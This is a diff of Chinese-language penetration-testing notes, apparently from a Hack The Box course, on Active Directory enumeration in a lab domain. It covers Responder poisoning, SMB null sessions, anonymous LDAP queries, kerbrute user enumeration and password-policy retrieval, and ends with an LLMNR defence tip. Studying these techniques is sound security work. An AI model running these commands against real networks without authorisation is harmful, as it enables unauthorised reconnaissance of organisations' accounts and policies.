@@ -22,10 +22,6 @@ Windows 操作系统中的本地权限提升 (privilege escalation) 缺陷，如
 本地链路多播名称解析 (LLMNR) 和 NetBIOS 名称服务 (NBT-NS) 是 Microsoft Windows 的组件，当 DNS 解析失败时，它们可作为主机识别的备用方法
 当使用 LLMNR/NBT-NS 进行名称解析时，网络上的任何主机都可以回复。这就是我们使用 Responder 来投毒这些请求的切入点
 
-SMB NULL 会话允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机的完整列表、用户帐户属性以及域密码策略
-进行枚举，可以使用 enum4linux、CrackMapExec、rpcclient 等工具
-rpcclient $> querydominfo
-
 利用Sysinternals、WMI、DNS 等原生工具和语言来枚举 AD
 练习攻击，包括密码喷洒 (Password spraying)、Kerberoasting
 使用 Responder、Kerbrute、Bloodhound 等工具
@@ -114,6 +110,11 @@ export PATH=/usr/local/bin/kerbrute:$PATH      添加到PAHT
 kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users      枚举用户
 
 
+SMB NULL 会话允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机的完整列表、用户帐户属性以及域密码策略
+进行枚举，可以使用 enum4linux、CrackMapExec、rpcclient 等工具
+rpcclient $> querydominfo
+rpcclient $> enumdomusers
+
 enum4linux 
 围绕 Samba 工具套件（如 nmblookup、net、rpcclient 和 smbclient）构建的工具，用于枚举 Windows 主机和域
   https://labs.portcullis.co.uk/tools/enum4linux/
@@ -124,19 +125,26 @@ enum4linux-ng
   https://github.com/cddmp/enum4linux-ng
 enum4linux-ng -P 172.16.5.5 -oA ilfreight
 
+crackmapexec
+smb 172.16.5.5 --users
+
 从 Windows 进行此类 null 会话攻击不太常见
 C:\htb> net use \\DC01\ipc$ "" /u:""       建立空对话
 C:\htb> net use \\DC01\ipc$ "" /u:guest    测试账号禁用
 C:\htb> net use \\DC01\ipc$ "password" /u:guest  测试密码错误 OR 账号锁定
 
 
-windapsearch.py
 ldapsearch
 ad-ldapdomaindump.py
 LDAP 匿名绑定允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机的完整列表、用户帐户属性以及域密码策略
 使用 netexec / crackmapexec 提取密码策略更加直接
   https://linux.die.net/man/1/ldapsearch
 ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+
+windapsearch.py
+同ldasearch
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
 
 
 查看密码策略
@@ -144,6 +152,8 @@ C:\htb> net accounts
 OR
 PS C:\htb> import-module .\PowerView.ps1
 PS C:\htb> Get-DomainPolicy
+创建新域时有默认密码策略，有大量的组织从未更改
+
 
 防御
 组策略 (Group Policy) 禁用 LLMNR，路径为：计算机配置 (Computer Configuration) -> 管理模板 (Administrative Templates) -> 网络 (Network) -> DNS 客户端 (DNS Client)，关闭多播名称解析 (Turn OFF Multicast Name Resolution)
